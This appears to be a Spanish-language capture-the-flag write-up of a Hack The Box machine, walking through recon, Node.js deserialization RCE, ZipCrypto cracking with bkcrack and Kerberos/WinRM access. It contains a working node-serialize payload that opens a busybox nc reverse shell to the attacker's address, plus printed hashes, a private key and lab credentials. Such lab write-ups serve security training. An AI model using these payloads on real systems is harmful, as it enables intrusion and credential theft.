---
title:
permalink: /Analytics-HTB-Writeup
toc:
toc_label: Topics
toc_sticky: true
tags:
sidebar: main
---
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.235.144                                           
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-20 00:08 -0500
Nmap scan report for 10.129.235.144
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8c:71:55:df:97:27:5e:d5:37:5a:8d:e2:92:3b:f3:6e (RSA)
|   256 b2:32:f5:88:9b:fb:58:fa:35:b0:71:0c:9a:bd:3c:ef (ECDSA)
|_  256 eb:73:c0:93:6e:40:c8:f6:b0:a8:28:93:7d:18:47:4c (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.99 seconds
```

## www.windcorp.htb

La pagina principal no tiene nada de nada.

![[Pasted image 20251220021117.png]]

## Gobuster subdomain enumeration

```bash
gobuster vhost -u http://windcorp.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 200 --append-domain
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://windcorp.htb
[+] Method:                    GET
[+] Threads:                   200
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 578 / 100000 (0.00%)[ERROR] error on word web: Get "http://windcorp.htb/": read tcp 10.10.17.19:38862->10.129.235.144:80: read: connection reset by peer
portal.windcorp.htb Status: 403 [Size: 2436]
```

#### /etc/hosts

```bash
cat /etc/hosts | grep windcorp
10.129.235.144 www.windcorp.htb windcorp.htb portal.windcorp.htb
```

## portal.windcorp.htb

Con el panel de loguin que tengo probe credenciales default como `admin:admin` o `admin:password`.

![[Pasted image 20251220021402.png]]

## Deserealization

Al entrar veo un mensaje que al parecer pone el tiempo que paso logueado en la `app`.

![[Pasted image 20251220021449.png]]

## Headers

![[Pasted image 20251220021551.png]]

![[Pasted image 20251220021610.png]]

https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

![[Pasted image 20251220021848.png]]

```node
{"rce":"_$$\u004e\u0044_FUNC$$_\u0066unction(){ require('child_process').exec('ping -c 1 10.10.17.19', function(error, stdout, stderr) { console.log(stdout) })}()"}
```

```bash
tcpdump -i tun0 icmp 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:35:05.144159 IP www.windcorp.htb > 10.10.17.19: ICMP echo request, id 1000, seq 1, length 64
00:35:05.144241 IP 10.10.17.19 > www.windcorp.htb: ICMP echo reply, id 1000, seq 1, length 64
```

```bash
{"rce":"_$$\u004e\u0044_FUNC$$_\u0066unction(){ require('child_process').exec('busybox nc 10.10.17.19 1337 -e /bin/bash', function(error, stdout, stderr) { console.log(stdout) })}()"}
```

```bash
nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.235.144] 58222
whoami
webster
```

```bash
webster@webserver:~$ ls
backup.zip
```

```bash
 7z l backup.zip 

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 72984 bytes (72 KiB)

Listing archive: backup.zip

--
Path = backup.zip
Type = zip
Physical Size = 72984

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-04-30 10:27:46 .....         1509          554  etc/passwd
2021-02-10 06:49:04 D....            0            0  etc/sssd/conf.d
2022-04-29 07:39:18 .....          411          278  etc/sssd/sssd.conf
2022-07-28 06:31:32 D....            0            0  var/lib/sss/db
2022-07-28 06:24:22 .....      1286144         3122  var/lib/sss/db/timestamps_windcorp.htb.ldb
2022-07-28 06:16:32 .....      1286144         2492  var/lib/sss/db/config.ldb
2022-07-28 06:16:22 D....            0            0  var/lib/sss/db/test
2022-07-28 06:01:24 .....      1286144         2421  var/lib/sss/db/test/timestamps_windcorp.htb.ldb
2022-07-28 06:04:31 .....      1286144         2536  var/lib/sss/db/test/config.ldb
2022-07-28 06:12:20 .....      1286144         5044  var/lib/sss/db/test/cache_windcorp.htb.ldb
2022-04-30 11:51:32 .....      1286144         1505  var/lib/sss/db/test/sssd.ldb
2022-07-28 06:04:42 .....         4016         3651  var/lib/sss/db/test/ccache_WINDCORP.HTB
2022-07-28 06:38:03 .....      1609728        10145  var/lib/sss/db/cache_windcorp.htb.ldb
2022-07-28 06:16:32 .....      1286144         1505  var/lib/sss/db/sssd.ldb
2022-07-28 06:31:32 .....         2708         2519  var/lib/sss/db/ccache_WINDCORP.HTB
2021-02-10 06:49:04 D....            0            0  var/lib/sss/deskprofile
2022-04-29 07:45:47 D....            0            0  var/lib/sss/gpo_cache
2022-04-29 07:45:47 D....            0            0  var/lib/sss/gpo_cache/windcorp.htb
2022-04-29 07:45:47 D....            0            0  var/lib/sss/gpo_cache/windcorp.htb/Policies
2022-07-28 06:24:22 D....            0            0  var/lib/sss/gpo_cache/windcorp.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
2022-04-29 07:45:47 D....            0            0  var/lib/sss/gpo_cache/windcorp.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine
2022-04-29 07:45:47 D....            0            0  var/lib/sss/gpo_cache/windcorp.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Microsoft
2022-04-29 07:45:47 D....            0            0  var/lib/sss/gpo_cache/windcorp.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Microsoft/Windows NT
2022-07-28 06:23:17 D....            0            0  var/lib/sss/gpo_cache/windcorp.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Microsoft/Windows NT/SecEdit
2022-07-28 06:23:17 .....         2568          700  var/lib/sss/gpo_cache/windcorp.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf
2022-07-28 06:24:22 .....           23           35  var/lib/sss/gpo_cache/windcorp.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
2021-02-10 06:49:04 D....            0            0  var/lib/sss/keytabs
2022-07-28 06:16:32 D....            0            0  var/lib/sss/mc
2022-07-28 06:24:17 .....      9253600         9186  var/lib/sss/mc/passwd
2022-07-28 06:16:32 .....      6940392         6814  var/lib/sss/mc/group
2022-07-28 06:23:17 .....     11567160        11389  var/lib/sss/mc/initgroups
2022-07-28 06:16:32 D....            0            0  var/lib/sss/pipes
2022-07-28 06:16:32 D....            0            0  var/lib/sss/pipes/private
2022-07-28 06:31:32 D....            0            0  var/lib/sss/pubconf
2022-07-28 06:31:32 .....           12           24  var/lib/sss/pubconf/kdcinfo.WINDCORP.HTB
2022-07-28 06:16:32 D....            0            0  var/lib/sss/pubconf/krb5.include.d
2022-07-28 06:16:32 .....           40           52  var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
2022-07-28 06:16:32 .....          113          105  var/lib/sss/pubconf/krb5.include.d/localauth_plugin
2022-07-28 06:16:32 .....           15           27  var/lib/sss/pubconf/krb5.include.d/domain_realm_windcorp_htb
2021-02-10 06:49:04 D....            0            0  var/lib/sss/secrets

```

```bash
7z -slt l backup.zip 

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 72984 bytes (72 KiB)

Listing archive: backup.zip

--
Path = backup.zip
Type = zip
Physical Size = 72984

----------
Path = etc/passwd
Folder = -
Size = 1509
Packed Size = 554
Modified = 2022-04-30 10:27:46
Created = 
Accessed = 
Attributes =  -rw-r--r--
Encrypted = +
Comment = 
CRC = D00EEE74
Method = ZipCrypto Deflate
Characteristics = UT:MA:1 ux : Encrypt Descriptor
Host OS = Unix
Version = 20
Volume Index = 0
Offset = 0
```

```bash
webster@webserver:/var/www/nonode$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>>  with open('/etc/passwd', 'rb') as f:
  File "<stdin>", line 1
    with open('/etc/passwd', 'rb') as f:
IndentationError: unexpected indent
>>>  with open('/etc/passwd', 'rb') as f:
  File "<stdin>", line 1
    with open('/etc/passwd', 'rb') as f:
IndentationError: unexpected indent
>>> with open('/etc/passwd', 'rb') as f:
... ...     data = f.read()
  File "<stdin>", line 2
    ...     data = f.read()
    ^
IndentationError: expected an indented block
>>> with open('/etc/passwd', 'rb') as f:
...     data = f.read()
... 
>>> hex(binascii.crc32(data) & 0xffffffff)
'0xd00eee74'

```

```bash
zip passwd.zip passwd 
  adding: passwd (deflated 64%)
                                                                                            
┌──(root㉿kali)-[/home/…/Desktop/htb/sekmeth/bkcrack-1.8.1-Linux-x86_64]
└─# ./bkcrack -C ../backup.zip -c etc/passwd -P passwd.zip -p passwd 
bkcrack 1.8.1 - 2025-10-25
[01:23:00] Z reduction using 535 bytes of known plaintext
100.0 % (535 / 535)
[01:23:01] Attack on 14541 Z values at index 9
Keys: d6829d8d 8514ff97 afc3f825
91.7 % (13340 / 14541)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 13340
[01:23:06] Keys
d6829d8d 8514ff97 afc3f825

```

```bash
./bkcrack -C ../backup.zip -k d6829d8d 8514ff97 afc3f825 -U unlocked.zip testing
bkcrack 1.8.1 - 2025-10-25
[01:24:55] Writing unlocked archive unlocked.zip with password "testing"
100.0 % (21 / 21)
Wrote unlocked archive.
                                                                                            
┌──(root㉿kali)-[/home/…/Desktop/htb/sekmeth/bkcrack-1.8.1-Linux-x86_64]
└─# ls
bkcrack  --help       passwd      pt.zip     tools
example  license.txt  passwd.zip  readme.md  unlocked.zip
                                                                                            
┌──(root㉿kali)-[/home/…/Desktop/htb/sekmeth/bkcrack-1.8.1-Linux-x86_64]
└─# 7z x unlocked.zip 

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 72984 bytes (72 KiB)

Extracting archive: unlocked.zip
--
Path = unlocked.zip
Type = zip
Physical Size = 72984

    
Enter password (will not be echoed):
Everything is Ok

Folders: 19
Files: 21
Size:       38385303
Compressed: 72984

```


```bash
cat passwd                     
�3@����ff��
s�b��������Bp�������ݱ�?A��?Mray.duncan@windcorp.htb*Ray Duncan/home/ray.duncan@windcorp.htb/bin/bash
```

```bash
cachedPassword
$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81
```

```javascript
// set up the session
app.use(
  session({
    secret: "appddppwW3#34512#dsdDfdfFvds sd",
    name: "app",
    resave: true,
    saveUninitialized: true
    // cookie: { maxAge: 6000 } /* 6000 ms? 6 seconds -> wut? :S */
  })
);
```

```javascript
app.use(express.static(path.join(__dirname, "public")));
//app.use(ntlm({
//    debug: function() {
//        var args = Array.prototype.slice.apply(arguments);
//        console.log.apply(null, args);
//    },
//    domain: 'WINDCORP',
//    domaincontroller: 'ldap://hope.windcorp.htb',
//}));

```

```bash
root@webserver:~# which ssh-keygen
/usr/bin/ssh-keygen
root@webserver:~# /usr/bin/ssh-keygen --help
unknown option -- -
usage: ssh-keygen [-q] [-a rounds] [-b bits] [-C comment] [-f output_keyfile]
                  [-m format] [-N new_passphrase] [-O option]
                  [-t dsa | ecdsa | ecdsa-sk | ed25519 | ed25519-sk | rsa]
                  [-w provider]
       ssh-keygen -p [-a rounds] [-f keyfile] [-m format] [-N new_passphrase]
                   [-P old_passphrase]
       ssh-keygen -i [-f input_keyfile] [-m key_format]
       ssh-keygen -e [-f input_keyfile] [-m key_format]
       ssh-keygen -y [-f input_keyfile]
       ssh-keygen -c [-a rounds] [-C comment] [-f keyfile] [-P passphrase]
       ssh-keygen -l [-v] [-E fingerprint_hash] [-f input_keyfile]
       ssh-keygen -B [-f input_keyfile]
       ssh-keygen -D pkcs11
       ssh-keygen -F hostname [-lv] [-f known_hosts_file]
       ssh-keygen -H [-f known_hosts_file]
       ssh-keygen -K [-a rounds] [-w provider]
       ssh-keygen -R hostname [-f known_hosts_file]
       ssh-keygen -r hostname [-g] [-f input_keyfile]
       ssh-keygen -M generate [-O option] output_file
       ssh-keygen -M screen [-f input_file] [-O option] output_file
       ssh-keygen -I certificate_identity -s ca_key [-hU] [-D pkcs11_provider]
                  [-n principals] [-O option] [-V validity_interval]
                  [-z serial_number] file ...
       ssh-keygen -L [-f input_keyfile]
       ssh-keygen -A [-a rounds] [-f prefix_path]
       ssh-keygen -k -f krl_file [-u] [-s ca_public] [-z version_number]
                  file ...
       ssh-keygen -Q [-l] -f krl_file [file ...]
       ssh-keygen -Y find-principals -s signature_file -f allowed_signers_file
       ssh-keygen -Y check-novalidate -n namespace -s signature_file
       ssh-keygen -Y sign -f key_file -n namespace file ...
       ssh-keygen -Y verify -f allowed_signers_file -I signer_identity
                -n namespace -s signature_file [-r revocation_file]
root@webserver:~# /usr/bin/ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:jDDqjz7UBbmgEq6GWt85YGAO/qIq98jMPqaoUT6GHxk root@webserver
The key's randomart image is:
+---[RSA 3072]----+
|     .           |
|. . o            |
|.o .oo           |
|+.o..o.o         |
|=+Eo .. S        |
|oB+o+            |
|=oOo o .         |
|+O=B. +          |
|@*@+o  .         |
+----[SHA256]-----+
root@webserver:~# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
cat debug-users.txt 
IvanJennings43235345
MiriamMills93827637
BenjaminHernandez23232323
RayDuncanwindcorp\scriptrunner
```

```bash
proxychains kinit bob.woodadm   
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  hope.windcorp.htb:88  ...  OK
Password for bob.woodadm@WINDCORP.HTB:
```


```bash
proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb
```

```powershell
*Evil-WinRM* PS C:\Users\bob.woodadm\Documents> type ../../administrator/desktop/root.txt
86a151f4a518ba98293ccbadb8779e1c
```